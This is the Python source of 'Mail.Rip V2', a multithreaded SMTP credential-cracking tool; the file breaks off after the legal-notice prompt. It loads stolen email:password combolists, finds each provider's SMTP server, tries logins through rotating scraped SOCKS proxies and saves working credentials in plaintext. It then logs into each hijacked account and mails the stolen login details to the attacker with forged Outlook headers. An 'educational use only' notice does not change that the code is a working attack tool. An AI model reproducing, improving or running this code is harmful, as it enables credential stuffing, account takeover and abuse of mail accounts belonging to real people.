#!/usr/local/bin/python3
# -*- coding: utf-8 -*-

'''
                              ### LEGAL NOTICES ###

           You are only allowed to use the following code for educational
           purposes! Mail.Rip v2 shall not be used for any kind of illegal
           activity nor law enforcement at any time.
           This restriction applies to all cases of usage, no matter whether
           the code as a whole or only parts of it are being used.

                          ### END OF LEGAL NOTICES ###

        +-------------------------------------------------------------------+
        | PROJECT:      Mail.Rip V2                                         |
        | DESCRIPTION:  SMTP checker / SMTP cracker for mailpass combolists |
        | RELEASE:      X (final version, 2021-03-27)                       |
        | AUTHOR:       DrPython3 @ GitHub.com                              |
        +===================================================================+
        | Based on Mail.Rip V1, this is the new and improved version.       |
        | It is still a SMTP checker / SMTP cracker testing your mailpass   |
        | combolists for working SMTP accounts. Nevertheless, the code has  |
        | been cleaned, improved and commented.                             |
        | Mail.Rip V2 is faster and more reliable, still providing support  |
        | for SOCKS4 / SOCKS5 proxys and verifying working email delivery   |
        | for every valid SMTP login being found.                           |
        +-------------------------------------------------------------------+
        |                                                                   |
        |         SUPPORT THIS PROJECT: BUY ME A COFFEE OR DONATE!          |
        |                                                                   |
        |             BTC: 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5               |
        |             LTC: LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7               |
        |                                                                   |
        |         All donations are appreciated - coffee even more.         |
        |                                                                   |
        +-------------------------------------------------------------------+
'''

# [*** Python Modules ***]
# ########################
import sys
try:
    import os
    import smtplib
    import socket
    import ssl
    import threading
    import json
    import re
    import uuid
    import socks
    import urllib3
    import certifi
    import dns.resolver
    import colorama
    from tqdm import tqdm
    from time import sleep
    from email.message import EmailMessage
    from random import randint
    from queue import Queue
except:
    sys.exit('[ERROR] Cannot import the needed Python modules!'
             + '\nCheck dependencies and start Mail.Rip v2 again.\n\n')

# initialize colorama:
colorama.init(autoreset=True)


# [*** Variables, Lists, Dictionaries ***]
# ########################################
locker = threading.Lock()
attack_queue = Queue()

default_timeout = float(3.0)
default_threads = int(9)
default_blacklist = True
attacker_mail = 'invalid@mail.sad'

use_socks = False
type_socks = 'SOCKS4'
amount_socks = int(0)
socksproxys = []

count_threads = int(0)
combos = []
targetsleft = int(0)
hits = int(0)
emailssent = int(0)
fails = int(0)

# lists, dictionaries from library.json:
try:
    with open('library.json') as included_imports:
        jsonobj = json.load(included_imports)
        smtpdomains = (jsonobj['smtpdomains'])
        smtpports = (jsonobj['smtpports'])
        commonports = (jsonobj['commonports'])
        hosterblacklist = (jsonobj['hosterblacklist'])
        socks4sources = (jsonobj['socks4sources'])
        socks5sources = (jsonobj['socks5sources'])
        emailcontent = (jsonobj['emailcontent'])
except:
    sys.exit(colorama.Fore.RED + '\n\n[ERROR] File "library.json" not found!\n'
             + 'Check the file and start Mail.Rip V2 again.\n\n')


# [*** Functions ***]
# ###################
def clean():
    '''
    Blank screen on purpose.

    :return: None
    '''
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    return None


def countdown(x):
    '''
    Simple countdown from "x".

    :param int x: countdown start
    :return: None
    '''
    i = int(x)
    while i > 0:
        if i < 3:
            print(colorama.Fore.RED + f'... {str(i)}')
        elif i < 4:
            print(colorama.Fore.YELLOW + f'... {str(i)}')
        else:
            print(colorama.Fore.GREEN + f'... {str(i)}')
        sleep(0.95)
        i -= 1
    return None


def writer(text, type):
    '''
    Saves any content to a TXT-file.

    :param str text: content to save
    :param str type: filename
    :return: True, False
    '''
    # create missing directory:
    try:
        os.makedirs('results')
    except:
        pass
    try:
        # set filename and path:
        file_name = str(f'{type}.txt')
        targetfile = os.path.join('results', file_name)
        # edit file:
        with open(str(targetfile), 'a+') as output_file:
            output_file.write(text + '\n')
        return True
    except:
        return False


def emailverify(email):
    '''
    Verifies format of an email address.

    :param str email: email address
    :return: True, False
    '''
    email_regex = '^([\w\.\-]+)@([\w\-]+)((\.(\w){2,63}){1,3})$'
    # verification:
    if re.search(email_regex, email):
        return True
    else:
        return False


def setdefaults():
    '''
    Set / change default values for attacks.

    :return: True, False
    '''
    global default_threads
    global default_timeout
    global default_blacklist
    global attacker_mail
    defaults_changed = int(0)
    clean()
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  EDIT DEFAULT VALUES:\n' + '-'*44 + '\n')
    # set amount of threads:
    try:
        default_threads = int(input('\nEnter amount of threads to use:\n' + colorama.Fore.YELLOW))
        print(colorama.Fore.GREEN + f'\nThreads set to {str(default_threads)}.\n')
        defaults_changed += 1
    except:
        default_threads = int(9)
        print(colorama.Fore.RED + f'\nNo change, Mail.Rip V2 will use {str(default_threads)} threads.\n')
    # set default timeout:
    try:
        default_timeout = float(input('\nEnter value for timeout:\n' + colorama.Fore.YELLOW))
        print(colorama.Fore.GREEN + f'\nTimeout set to {str(default_timeout)}.\n')
        defaults_changed += 1
    except:
        default_timeout = float(3.0)
        print(colorama.Fore.RED + f'\nNo change, timeout remains {str(default_timeout)}.\n')
    # de-/activate domain blacklist:
    try:
        blacklist = str(input('\nUse blacklist for email domains:\n(yes / no)    ' + colorama.Fore.YELLOW))
        if blacklist in ['n', 'no']:
            default_blacklist = False
            print(colorama.Fore.RED + '\nBlacklist for email domains deactivated.\n')
            defaults_changed +=1
        else:
            default_blacklist = True
            print(colorama.Fore.GREEN + '\nBlacklist for email domains remains activated.\n')
    except:
        pass
    # set user e-mail address:
    try:
        new_mail = str(input('\nEnter YOUR email for delivery test:\n' + colorama.Fore.YELLOW))
        verified = emailverify(str(new_mail))
        if verified == True:
            attacker_mail = str(new_mail)
            print(colorama.Fore.GREEN + f'\nEmail for delivery test set to: {str(attacker_mail)}.\n')
            defaults_changed += 1
        else:
            attacker_mail = str('invalid@mail.sad')
            print(colorama.Fore.RED + '\nNo valid email set for delivery test.\n')
    except:
        attacker_mail = str('invalid@mail.sad')
        print(colorama.Fore.RED + '\nNo valid email set for delivery test.\n')
    if defaults_changed > 0:
        return True
    else:
        return False


def proxychecker():
    '''
    Verifies scraped proxys are working.

    :return: None
    '''
    clean()
    valid_proxys = int(0)
    checkerssl = ssl.create_default_context()
    print(colorama.Fore.YELLOW + '\n\nChecking scraped proxys now ...\n')
    try:
        with open('proxys.txt', 'r+') as checked:
            # read scraped proxys:
            proxy_checks = checked.readlines()
            checked.seek(0)
            for proxy in tqdm(proxy_checks, desc='Checked'):
                try:
                    # get IP and port:
                    check_ip = str(str(proxy).split(':')[0])
                    check_port = int(str(proxy).split(':')[1])
                    # set prroxy:
                    if type_socks == 'SOCKS4':
                        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, check_ip, check_port)
                    else:
                        socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, check_ip, check_port)
                    socks.socket.setdefaulttimeout(float(1.0))
                    socks.wrapmodule(smtplib)
                    # establish SMTP connection:
                    checker_connection = smtplib.SMTP_SSL(host=str('smtp.gmail.com'),
                                                          port=int(465),
                                                          timeout=float(2.0),
                                                          context=checkerssl)
                    # send cmd and verify by status code:
                    test = checker_connection.noop()
                    checker_connection.quit()
                    # if status code ok, save proxy:
                    if re.search('250', str(test)):
                        valid_proxys += 1
                        checked.write(proxy)
                    # else drop proxy from list:
                    else:
                        pass
                except:
                    pass
            checked.truncate()
        if valid_proxys > 0:
            print(colorama.Fore.GREEN + f'\nWorking {type_socks}-proxys found: {str(valid_proxys)}')
        else:
            pass
    except:
        print(colorama.Fore.RED + '[ERROR] Checking scraped proxys failed ...')
    return None


def proxysupport():
    '''
    De- / activate proxy-support including scraper and checker.

    :return: True, False
    '''
    global use_socks
    global type_socks
    global amount_socks
    global socksproxys
    ip_regex = '(?:[0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]{1,5})'
    clean()
    # de- / activate proxy-support:
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  DE-/ACTIVATE PROXY-SUPPORT:\n' + '-'*51 + '\n\n')
    new_use = str(input('Activate proxy-support?\n(yes / no)    ' + colorama.Fore.YELLOW))
    if new_use in ['y', 'ye', 'yes']:
        use_socks = True
    else:
        pass
    # if activated, set proxy-type:
    if use_socks == True:
        new_type = str(input(colorama.Fore.WHITE
                             + '\n\nType of proxys to use?\n(SOCKS4 / SOCKS5)    ' + colorama.Fore.YELLOW))
        if new_type in ['5', 's5', 'sock5', 'socks5']:
            type_socks = str('SOCKS5')
            print(colorama.Fore.GREEN + '\n\nProxy-support << ACTIVATED >> using SOCKS5 proxys.')
        else:
            print(colorama.Fore.GREEN + '\n\nProxy-support << ACTIVATED >> using SOCKS4 proxys.')
    # if deactivated, end function:
    else:
        return False
    # get proxy sources:
    if type_socks == 'SOCKS4':
        sources = socks4sources
    elif type_socks == 'SOCKS5':
        sources = socks5sources
    # start scraping:
    print(colorama.Fore.YELLOW + f'\n\nScraping {type_socks}-proxys (...)')
    socket.setdefaulttimeout(default_timeout)
    for source in sources:
        try:
            http = urllib3.PoolManager(ca_certs=certifi.where())
            scraped = http.request('GET', str(source))
            # saved to temporary txt-file:
            with open('scraped.txt', 'a') as output_file:
                output_file.write(str(scraped.data.decode('utf-8')))
            print(colorama.Fore.GREEN + f'Scraped: {str(source)}')
        except:
            print(colorama.Fore.RED + f'Scraping failed for: {str(source)}')
            continue
    # clean up scraped data:
    print(colorama.Fore.YELLOW + '\n\nRemoving unwanted text from results ...')
    try:
        with open('scraped.txt', 'r+') as scraped_data:
            valid_proxy = scraped_data.readlines()
            scraped_data.seek(0)
            for line in valid_proxy:
                # verify IP format:
                if re.search(ip_regex, line):
                    scraped_data.write(line)
            scraped_data.truncate()
        print(colorama.Fore.GREEN + 'Unwanted text removed successfully.')
    except:
        print(colorama.Fore.RED + 'Removing unwanted text failed.')
    # remove duplicates:
    print(colorama.Fore.YELLOW + '\n\nRemoving duplicates from results ...')
    try:
        unique_proxys = set()
        with open('proxys.txt', 'w') as cleaned:
            for line in open('scraped.txt', 'r'):
                if line not in unique_proxys:
                    cleaned.write(line)
                    unique_proxys.add(line)
        print(colorama.Fore.GREEN + 'Duplicates successfully removed.')
    except:
        print(colorama.Fore.RED + 'Removing duplicates failed.')
    try:
        skip_check = str(input(colorama.Fore.WHITE + '\n\nSkip proxy checker?\n(yes / no)    ' + colorama.Fore.YELLOW))
        if skip_check in ['y', 'ye', 'yes']:
            pass
        else:
            proxychecker()
            print(colorama.Fore.GREEN + '\n\nScraped proxys have been checked!')
            sleep(3.0)
    except:
        pass
    # load proxys into list:
    print(colorama.Fore.YELLOW + '\n\nLoading proxys into global list ...')
    try:
        socksproxys = open('proxys.txt', 'r').read().splitlines()
        amount_socks = int(len(socksproxys))
        print(colorama.Fore.GREEN + 'Proxys loaded into global list.')
        # delete temporary files:
        if os.name == 'nt':
            os.system('del proxys.txt')
            os.system('del scraped.txt')
        else:
            os.system('rm proxys.txt')
            os.system('rm scraped.txt')
        return True
    except:
        print(colorama.Fore.RED + '[ERROR] Loading proxys failed!\nProxy-support is deactivated for your attacks.')
        use_socks = False
        return False


def getrandomproxy():
    '''
    Provides a randomly chosen proxy.

    :return: proxy-ip
    '''
    x = randint(0, int(amount_socks))
    proxy = str(socksproxys[int(x)])
    return proxy


def blacklistcheck(domain):
    '''
    Checks blacklist for given e-mail domain.

    :param str domain: e-mail domain
    :return: True, False
    '''
    try:
        x = int(hosterblacklist.count(str(domain)))
        if x == 0:
            return False
        else:
            return True
    except:
        print(colorama.Fore.RED + f'Blacklist check failed for: {str(domain)} ...')
        return False


def mxlookup(worker_name, domain):
    '''
    Looks up SMTP host in MX records of e-mail domain.

    :param str worker_name: thread ID
    :param str domain: e-mail domain
    :return: found_host
    '''
    socket.setdefaulttimeout(float(default_timeout))
    domain_regex = '^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$'
    found_host = str('no_host_found')
    # set up resolver:
    lookup = dns.resolver.Resolver(configure=False)
    # use Google nameserver:
    lookup.nameservers = ['8.8.8.8']
    # start lookup:
    try:
        with locker:
            print(colorama.Fore.WHITE
                  + f'[{str(worker_name)}]: Looking up SMTP-host in MX records of {str(domain)}')
        raw_result = lookup.resolve(str(domain), 'MX')
        # get first result:
        mx_host = str(raw_result[0]).split(' ')[1].rstrip('.')
        if re.search(domain_regex, mx_host):
            # if format is verified, set found_host:
            found_host = str(mx_host)
        # else get second result:
        else:
            mx_host = str(raw_result[1]).split(' ')[1].rstrip('.')
            if re.search(domain_regex, mx_host):
                found_host = str(mx_host)
            else:
                with locker:
                    print(colorama.Fore.RED
                          + f'[{str(worker_name)}]: No SMTP-host found in MX records of {str(domain)}')
                return found_host
        # return found host, else "no_host_found":
        with locker:
            print(colorama.Fore.GREEN
                  + f'[{str(worker_name)}]: SMTP-host {str(found_host)} found in MX records of {str(domain)}')
        return found_host
    except:
        with locker:
            print(colorama.Fore.RED + f'[{str(worker_name)}]: No SMTP-host found in MX records of {str(domain)}')
        return found_host


def unknownport(worker_name, smtphost):
    '''
    Looks for unknown port by trying most common ones.

    :param str worker_name: thread ID
    :param str smtphost: host with unknown port
    :return: found_port
    '''
    found_port = int(0)
    unkportssl = ssl.create_default_context()
    with locker:
        print(colorama.Fore.WHITE + f'[{str(worker_name)}]: Searching connection port of {str(smtphost)}')
    for port in commonports:
        # get port to test:
        test_port = int(port)
        try:
            # set up a random proxy if activated:
            if use_socks == True:
                get_proxy = str(getrandomproxy())
                proxy_ip = str(get_proxy.split(':')[0])
                proxy_port = int(get_proxy.split(':')[1])
                if type_socks == 'SOCKS4':
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_ip, proxy_port)
                else:
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, proxy_port)
                socks.socket.setdefaulttimeout(float(default_timeout))
                socks.wrapmodule(smtplib)
            # else, set default timeout:
            else:
                socket.setdefaulttimeout(float(default_timeout))
            # try connection:
            try:
                # try SSL-connection for port 465:
                if int(test_port) == 465:
                    connection = smtplib.SMTP_SSL(smtphost, test_port, timeout=default_timeout, context=unkportssl)
                else:
                    # try standard connection for other ports:
                    connection = smtplib.SMTP(smtphost, test_port, timeout=default_timeout)
                connection.quit()
            except:
                continue
            with locker:
                print(colorama.Fore.GREEN
                      + f'[{str(worker_name)}]: successfully connected to {str(smtphost)}:{str(test_port)}')
            found_port = int(test_port)
            break
        except:
            continue
    return found_port


def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, proxyport):
    '''
    Tries to send emails using found SMTP logins.

    :param str smtphost: SMTP address
    :param int smtpport: SMTP connection port
    :param str smtpuser: SMTP username
    :param str smtppass: SMTP password
    :param str smtpemail: SMTP email address
    :param str proxyip: SOCKS-proxy IP
    :param int proxyport: SOCKS-proxy port
    :return: True, False
    '''
    global emailssent
    emailssl = ssl.create_default_context()
    # set proxy if activated:
    if use_socks == True:
        if type_socks == 'SOCKS4':
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport)
        elif type_socks == 'SOCKS5':
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport)
        socks.socket.setdefaulttimeout(default_timeout)
        socks.wrapmodule(smtplib)
    else:
        socket.setdefaulttimeout(default_timeout)
    try:
        # get random email content:
        first_text = 'first' + str(randint(1, 5))
        second_text = 'second' + str(randint(1, 5))
        last_text = 'last' + str(randint(1, 5))
        first_line = str(emailcontent[first_text])
        second_line = str(emailcontent[second_text])
        last_line = str(emailcontent[last_text])
        # set up email letter:
        email_content = str(
            first_line + '\n'
            + second_line + '\n\n'
            + f'email address: {smtpemail}\n'
            + f'smtp host: {smtphost}:{str(smtpport)}\n'
            + f'smtp user: {smtpuser}\n'
            + f'smtp password: {smtppass}\n\n'
            + last_line + '\n'
        )
        # generate random ID:
        randomid = str(uuid.uuid4().hex)[0:6].upper()
        # generate email:
        letter = EmailMessage()
        letter.add_header('Subject', str(f'id {randomid} test result'))
        letter.add_header('From', str(f'MailRipV2 <{smtpemail}>'))
        letter.add_header('To', str(f'MailRip User <{attacker_mail}>'))
        letter.add_header('Reply-To', smtpemail)
        letter.add_header('MIME-Version', '1.0')
        letter.add_header('Content-Type', 'text/plain;charset=UTF-8')
        letter.add_header('X-Priority', '1')
        letter.add_header('X-MSmail-Priority', 'High')
        letter.add_header('X-Mailer', 'Microsoft Office Outlook, Build 17.551210')
        letter.add_header('X-MimeOLE', 'Produced By Microsoft MimeOLE V6.00.3790.1830')
        letter.set_content(email_content)
    except:
        return False
    try:
        # connect to SMTP and send email:
        if smtpport == 465:
            victim = smtplib.SMTP_SSL(smtphost, smtpport, timeout=float(60.0), context=emailssl)
        else:
            victim = smtplib.SMTP(smtphost, smtpport, timeout=float(60.0))
            try:
                victim.ehlo()
                victim.starttls(context=emailssl)
                victim.ehlo()
            except:
                pass
        victim.login(smtpuser, smtppass)
        victim.send_message(letter, from_addr=smtpemail, to_addrs=[attacker_mail])
        victim.quit()
        # return True for sent emails:
        emailssent += 1
        return True
    except:
        return False


def comboloader():
    '''
    Loads combos from file.

    :return: True, False
    '''
    global combos
    clean()
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  COMBOLOADER:\n' + '-'*36 + '\n\n')
    # get filename of combosource:
    input_file = str(input('Enter file with combos, e.g. combos.txt:\n' + colorama.Fore.YELLOW))
    if input_file == '':
        return False
    else:
        print(colorama.Fore.WHITE + f'\nReading and preparing combos from file: {input_file}')
    # read, prepare and load combos:
    try:
        # -- STEP 1 --
        # create temporary file for cleaned combos:
        with open('targets_temp.txt', 'w') as temp_file:
            for line in open(input_file, 'r'):
                # replace common separators with ":"
                line = str(line).replace(';', ':').replace('|', ':').replace(',', ':')
                # verify format of email address:
                verify_email = str(line.split(':')[0])
                result_verify = emailverify(verify_email)
                if result_verify == False:
                    continue
                else:
                    pass
                # check blacklist for email domain:
                if default_blacklist == True:
                    blacklist_domain = str(verify_email.split('@')[1])
                    blacklist_result = blacklistcheck(blacklist_domain)
                    if blacklist_result == True:
                        print(colorama.Fore.RED + f'Blacklist Check: {blacklist_domain} [FAILED], '
                              + f'skipping target {verify_email}')
                        # if blacklisted, save to blacklisted-file:
                        writer_result = writer(line, str('__blacklisted__'))
                        continue
                    else:
                        pass
                else:
                    pass
                # save cleaned combos:
                temp_file.write(line)
        # -- STEP 2 --
        # create object for caching:
        combos_cleaned = set()
        # create file for fully cleaned combos:
        with open('targets.txt', 'w') as output_file:
            for line in open(str('targets_temp.txt'), 'r'):
                # check whether combo us unique:
                if line not in combos_cleaned:
                    # if unique, save to file:
                    output_file.write(line)
                    combos_cleaned.add(line)
                else:
                    continue
        try:
            del combos_cleaned
        except:
            pass
        # -- STEP 3 --
        # load combos into cache:
        combos = open('targets.txt', 'r').read().splitlines()
        # delete temporary and combofiles:
        try:
            if os.name =='nt':
                os.system(f'del {input_file}')
                os.system('del targets_temp.txt')
            else:
                os.system(f'rm {input_file}')
                os.system('rm targets_temp.txt')
        except:
            pass
        # get amount of combos:
        result_loader = int(len(combos))
        # return True for at least one combo loaded:
        if result_loader > 0:
            return True
        else:
            print(colorama.Fore.RED + '\nNo combos loaded.')
            return False
    except:
        return False


def attacker(attackid, target):
    '''
    The full attack on each target.

    :param str attackid: thread ID
    :param str target: combo
    :return: True, False
    '''
    global hits
    # set attacker ID:
    attacker_id = str(f'ATTACKER#{str(attackid)}')
    attackerssl = ssl.create_default_context()
    try:
        # reset variables:
        target_email = str('')
        target_host = str('')
        target_port = int(0)
        target_user = str('')
        target_pass = str('')
        proxy_host = str('none')
        proxy_port = int(0)
        next_combo = str('')
        # set proxy if activated:
        if use_socks == True:
            get_proxy = str(getrandomproxy())
            proxy_host = str(get_proxy.split(':')[0])
            proxy_port = int(get_proxy.split(':')[1])
            if type_socks == 'SOCKS4':
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_host, proxy_port)
            else:
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port)
            socks.socket.setdefaulttimeout(default_timeout)
            socks.wrapmodule(smtplib)
        # else set default timeout:
        else:
            socket.setdefaulttimeout(default_timeout)
        # set next target:
        next_combo = str(target)
        # save to checked.txt:
        result_writer = writer(next_combo, str('__checked__'))
        with locker:
            print(colorama.Fore.YELLOW + f'[{str(attacker_id)}]: Checking combo {next_combo}')
        # start checking:
        target_email = str(next_combo.split(':')[0])
        target_pass = str(next_combo.split(':')[1])
        target_user = str(target_email)
        # get target-host from hosterlist:
        target_domain = str(target_email.split('@')[1]).lower()
        try:
            target_host = str(smtpdomains[target_domain])
        except:
            # on errors, lookup host in MX records:
            lookup_host = str(mxlookup(attacker_id, target_domain))
            # if lookup fails, end attack:
            if lookup_host == 'no_host_found':
                result_writer = writer(str(next_combo), str('__invalid__'))
                return False
            # else set found target_host:
            else:
                target_host = str(lookup_host)
        # get targetport from hosterlist:
        try:
            target_port = int(smtpports[target_host])
        except:
            # on errors search for port:
            find_port = int(unknownport(str(attacker_id), target_host))
            # if search for port fails, end attack:
            if find_port == 0:
                with locker:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-port found for {next_combo}')
                result_writer = writer(next_combo, str('__invalid__'))
                return False
            # else set target_port:
            else:
                target_port = int(find_port)
        # attack target:
        # step#1 - establish connection:
        try:
            with locker:
                print(colorama.Fore.WHITE
                      + f'[{str(attacker_id)}]: Connecting to {target_host} for checking {next_combo}')
            # try SSL-connection for port 465:
            if int(target_port) == 465:
                attack = smtplib.SMTP_SSL(target_host, target_port, timeout=default_timeout, context=attackerssl)
            else:
                # try standard connection for other ports:
                attack = smtplib.SMTP(target_host, target_port, timeout=default_timeout)
                try:
                    # try to establish TLS:
                    attack.ehlo()
                    attack.starttls(context=attackerssl)
                    attack.ehlo()
                except:
                    pass
        except:
            # cancel attack if connection fails:
            with locker:
                print(colorama.Fore.RED + f'[{str(attacker_id)}]: Connection to {target_host} failed')
            result_writer = writer(next_combo, str('__invalid__'))
            return False
        # step#2.1 - try login with e-mail:
        try:
            with locker:
                print(colorama.Fore.WHITE + f'[{str(attacker_id)}]: Testing login for combo {next_combo}')
            attack.login(target_user, target_pass)
        # step#2.2 - on errors try login with user from e-mail:
        except:
            try:
                # set target_user = e-mail pseudo:
                target_user = str(target_email.split('@')[0])
                attack.login(target_user, target_pass)
            except:
                try:
                    attack.quit()
                except:
                    pass
                # end attack if login fails again:
                with locker:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: No hit for combo {next_combo}')
                result_writer = writer(next_combo, str('__invalid__'))
                return False
        # step#3 - save results:
        try:
            # close the connection:
            attack.quit()
        except:
            pass
        with locker:
            print(colorama.Fore.GREEN
                  + '\n' + '#'*80 + '\n' + f'[{str(attacker_id)}]: HIT FOR {next_combo}\n' + '#'*80 + '\n')
        # save hit to txt-file named like the SMTP-host:
        result_writer = writer(
            str(f'EMAIL: {str(target_email)}, '
                + f'HOST: {str(target_host)}, '
                + f'PORT: {str(target_port)}, '
                + f'USER: {str(target_user)}, '
                + f'PASS: {str(target_pass)}'), str(f'{str(target_host)}'))
        # save hit to txt-file "__valid__.txt":
        result_writer = writer(
            str(f'EMAIL: {str(target_email)}, '
                + f'HOST: {str(target_host)}, '
                + f'PORT: {str(target_port)}, '
                + f'USER: {str(target_user)}, '
                + f'PASS: {str(target_pass)}'), str('__valid__'))
        hits += 1
        # step#4 - for hits, call deliverytest function:
        if attacker_mail == 'invalid@mail.sad':
            pass
        else:
            result_delivery = deliverytest(
                str(target_host),
                int(target_port),
                str(target_user),
                str(target_pass),
                str(target_email),
                str(proxy_host),
                int(proxy_port))
            # for sent emails, save hit to sentemail.txt:
            if result_delivery == True:
                with locker:
                    print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: E-mail sent with {target_email}')
                result_writer = writer(
                    str(f'MAIL: {str(target_email)}, '
                        + f'HOST: {str(target_host)}, '
                        + f'PORT: {str(target_port)}, '
                        + f'USER: {str(target_user)}, '
                        + f'PASS: {str(target_pass)}'), str('__emailtest__'))
            else:
                with locker:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: E-mail test failed for {target_email}')
        return True
    except:
        with locker:
            print(colorama.Fore.RED + f'[{str(attacker_id)}]: An error occurred while checking {next_combo}')
        result_writer = writer(next_combo, str('__invalid__'))
        return False


def attack_threader():
    '''
    Function for attack threads.

    :return: None
    '''
    global targetsleft
    global fails
    attacker_id = str(count_threads)
    while True:
        next_target = str(attack_queue.get())
        result = attacker(attacker_id, next_target)
        if result == False:
            fails += 1
        else:
            pass
        targetsleft -= 1
        attack_queue.task_done()
    return None


def startattack():
    '''
    Starts attack threading, provides stats in window title.

    :return: None
    '''
    global count_threads
    global targetsleft
    global hits
    global fails
    clean()
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  STARTING ATTACK:\n' + '-'*40 + '\n')
    countdown(5)
    # set amount of targets:
    targetsleft = int(len(combos))
    # start threads:
    for _ in range(default_threads):
        count_threads += 1
        attack_thread = threading.Thread(target=attack_threader)
        attack_thread.daemon = True
        attack_thread.start()
    # fill queue:
    for target in combos:
        attack_queue.put(target)
    # show stats in title:
    while targetsleft > 0:
        try:
            sleep(0.5)
            wintitle = f'TO CHECK: {str(targetsleft)} # HITS: {str(hits)} # EMAILS: {str(emailssent)} # FAILS: {str(fails)}'
            sys.stdout.write('\33]0;' + str(wintitle) + '\a')
            sys.stdout.flush()
        except:
            pass
    print(colorama.Fore.YELLOW + '\n' + '#'*44 + '\n# FINISHING ATTACK! BE PATIENT, PLEASE ... #\n' + '#'*44 + '\n')
    attack_queue.join()
    sleep(3.0)
    clean()
    input(colorama.Fore.YELLOW + '\n\nINFO\n' + '-'*4 + '\n'
          + f'Attack has been finished. Results: HITS = {str(hits)}, BAD = {str(fails)}.\n'
          + 'Press [ENTER] to return to the main menu.')
    # reset stats:
    targetsleft = int(0)
    hits = int(0)
    fails = int(0)
    return None


# [*** LOGOS && ETC ***]
# ######################
legal_logo = '''
                           ##############################
                           #     I M P O R T A N T:     #
                           # L E G A L    N O T I C E S #
                           ##############################

           You are only allowed to use the following code for educational
           purposes! Mail.Rip v2 shall not be used for any kind of illegal
           activity nor law enforcement at any time.
           
           This restriction applies to all cases of usage, no matter whether
           the code as a whole or only parts of it are being used.

'''

main_logo = '''

            ################## DrPython3 @ GitHub.Com ##################
            
             ███▄ ▄███▓ ▄▄▄       ██▓ ██▓          ██▀███   ██▓ ██▓███  
            ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒         ▓██ ▒ ██▒▓██▒▓██░  ██▒
            ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░         ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒
            ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒██▀▀█▄  ░██░▒██▄█▓▒ ▒
            ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒ ██▓ ░██▓ ▒██▒░██░▒██▒ ░  ░
            ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░ ▒▓▒ ░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░
            ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ░▒    ░▒ ░ ▒░ ▒ ░░▒ ░     
            ░      ░     ░   ▒    ▒ ░  ░ ░    ░     ░░   ░  ▒ ░░░       
                   ░         ░  ░ ░      ░  ░  ░     ░      ░           
                                               ░                        
            (donations):        btc = 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5
                                ltc = LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7
            ____________________________________________________________
            
                             -+==> [ MAIN MENU ] <==+-
            
            [1] SET DEFAULT VALUES        [2] DE-/ACTIVATE PROXY-SUPPORT
            [3] LOAD COMBOS               [4] START ATTACK
                                          [0] EXIT MAIL.RIP V2
            
            [FINAL RELEASE]######################################[v2|RX]

'''

# often used phrases:
p1 = '\nPress [ENTER] to return to main menu.'


# [*** MAIN ***]
# ##############
def mainmenu():
    '''
    The main menu.

    :return: None
    '''
    # clean screen, print logo:
    clean()
    print(colorama.Fore.RED + main_logo)
    option = input('Choose an option, please:    ' + colorama.Fore.YELLOW)
    # option 0 / exit:
    if option == '0':
        clean()
        sys.exit(colorama.Fore.YELLOW + '\n\nClosing Mail.Rip v2 ...\nSee you again!')
    # option 1 / set defaults:
    elif option == '1':
        status_msg = setdefaults()
        if status_msg == True:
            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*7 + '\nDefault values changed.' + f'{p1}')
        else:
            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*5 + '\nDefault values not changed.' + f'{p1}')
    # option 2 / proxy-support:
    elif option == '2':
        status_msg = proxysupport()
        if status_msg == True:
            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*7
                  + f'\nProxy-support has been activated using {str(type_socks)} proxys.' + f'{p1}')
        else:
            input(colorama.Fore.RED + '\n\nWARNING\n' + '-'*7 + '\nProxy-support is still deactivated.' + f'{p1}')
    # option 3 / load combos:
    elif option == '3':
        status_msg = comboloader()
        if status_msg == True:
            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*7
                  + f'\nCombos successfully loaded. Amount: {str(len(combos))}' + f'{p1}')
        else:
            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*5 + '\nLoading combos failed.' + f'{p1}')
    # option 4 / start attack:
    elif option == '4':
        startattack()
    # any other input / restart:
    else:
        clean()
        input(colorama.Fore.YELLOW + 'INFO\n' + '-'*4 + '\nNo option entered.' + f'{p1}')
    return None


# clean screen, print legal notices:
clean()
print(colorama.Fore.RED + legal_logo)
legal_confirm = input('CONFIRM WITH [ENTER] OR TYPE "NO":    ' + colorama.Fore.YELLOW)
# exit if not confirmed:
